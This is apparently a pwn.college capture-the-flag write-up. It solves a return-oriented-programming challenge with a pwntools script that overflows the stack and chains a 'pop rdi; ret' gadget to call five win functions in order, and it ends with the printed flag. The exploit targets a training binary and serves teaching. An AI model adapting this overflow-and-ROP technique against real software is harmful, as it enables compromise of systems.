1. Read
hacker@return-oriented-programming-level-3-0:~$ /challenge/babyrop_level3.0
###
### Welcome to /challenge/babyrop_level3.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffd73baa768, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (101 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Received 1 bytes! This is potentially -15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 4294967282 gadgets of ROP chain at 0x7ffd73baa768.

Leaving!
### Goodbye!

2. Check the security of the binary file. No canary found so we can just do as the challenge says
hacker@return-oriented-programming-level-3-0:~$ checksec /challenge/babyrop_level3.0
[*] '/challenge/babyrop_level3.0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

3. Find the address for all the win_stage using readelf
hacker@return-oriented-programming-level-3-0:~$ readelf -s  /challenge/babyrop_level3.0 | grep win_stage
    65: 0000000000402047   220 FUNC    GLOBAL DEFAULT   15 win_stage_1
    66: 00000000004022e9   226 FUNC    GLOBAL DEFAULT   15 win_stage_3
    67: 0000000000401f64   227 FUNC    GLOBAL DEFAULT   15 win_stage_5
    92: 0000000000402123   224 FUNC    GLOBAL DEFAULT   15 win_stage_2
    93: 0000000000402203   230 FUNC    GLOBAL DEFAULT   15 win_stage_4

4. Each function have an argument, thus we need to find the address popret1. This is done using ropgadget from ROPgadget.py. Since the argument needed is only 1, we just need to find 'pop rdi' on ropgadget
hacker@return-oriented-programming-level-3-0:~$ ROPgadget --binary /challenge/babyrop_level3.0 | grep 'pop rdi'
0x00000000004026e3 : pop rdi ; ret

5. Construct the payload
from pwn import *

def construct_payload():
    win_1 = 0x0000000000402047
    win_2 = 0x0000000000402123
    win_3 = 0x00000000004022e9
    win_4 = 0x0000000000402203
    win_5 = 0x0000000000401f64

    lstFunAddr = [win_1, win_2, win_3, win_4, win_5]
    popret1 = 0x00000000004026e3
    
    # Construct the ROP chain
    rop_chain = cyclic(120)
    for i in range(len(lstFunAddr)):
        rop_chain += p64(popret1)
        rop_chain += p64(i+1)
        rop_chain += p64(lstFunAddr[i])
        

    return rop_chain


payload = construct_payload()
print("payload: ", end="")
print(payload)

p = process("/challenge/babyrop_level3.0")
p.send(payload)

output = p.recvall()
print(output.decode())
p.close()

6. run it 
hacker@return-oriented-programming-level-3-0:~$ /bin/python /home/hacker/Documents/3.py
payload: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab\xe3&@\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00G @\x00\x00\x00\x00\x00\xe3&@\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00#!@\x00\x00\x00\x00\x00\xe3&@\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xe9"@\x00\x00\x00\x00\x00\xe3&@\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x03"@\x00\x00\x00\x00\x00\xe3&@\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00d\x1f@\x00\x00\x00\x00\x00'
[+] Starting local process '/challenge/babyrop_level3.0': pid 28092
[+] Receiving all data: Done (2.74KB)
[*] Process '/challenge/babyrop_level3.0' stopped with exit code -11 (SIGSEGV) (pid 28092)
###
### Welcome to /challenge/babyrop_level3.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 5 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_5`.
In order to get the flag, you will need to call all of these stages in order.

In addition to calling each function in the right order, you must also pass an argument to each of them! The argument
you pass will be the stage number. For instance, `win_stage_1(1)`.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffc2c5c9898, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (101 to fill the buffer,
19 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
Received 240 bytes! This is potentially 15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 16 gadgets of ROP chain at 0x7ffc2c5c9898.
| 0x00000000004026e3: pop rdi ; ret  ; 
| 0x0000000000000001: (UNMAPPED MEMORY)
| 0x0000000000402047: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 1 ; je 0x402076 ; lea rdi, [rip + 0x112c] ; call 0x401150 ; 
| 0x00000000004026e3: pop rdi ; ret  ; 
| 0x0000000000000002: (UNMAPPED MEMORY)
| 0x0000000000402123: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 2 ; je 0x402152 ; lea rdi, [rip + 0x1050] ; call 0x401150 ; 
| 0x00000000004026e3: pop rdi ; ret  ; 
| 0x0000000000000003: (UNMAPPED MEMORY)
| 0x00000000004022e9: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 3 ; je 0x402318 ; lea rdi, [rip + 0xe8a] ; call 0x401150 ; 
| 0x00000000004026e3: pop rdi ; ret  ; 
| 0x0000000000000004: (UNMAPPED MEMORY)
| 0x0000000000402203: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 4 ; je 0x402232 ; lea rdi, [rip + 0xf70] ; call 0x401150 ; 
| 0x00000000004026e3: pop rdi ; ret  ; 
| 0x0000000000000005: (UNMAPPED MEMORY)
| 0x0000000000401f64: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; cmp dword ptr [rbp - 0x114], 5 ; je 0x401f93 ; lea rdi, [rip + 0x120f] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
pwn.college{IDrk7ay1NB418fK6q1PwC2cjziA.0VN0MDL2kDNzMzW}


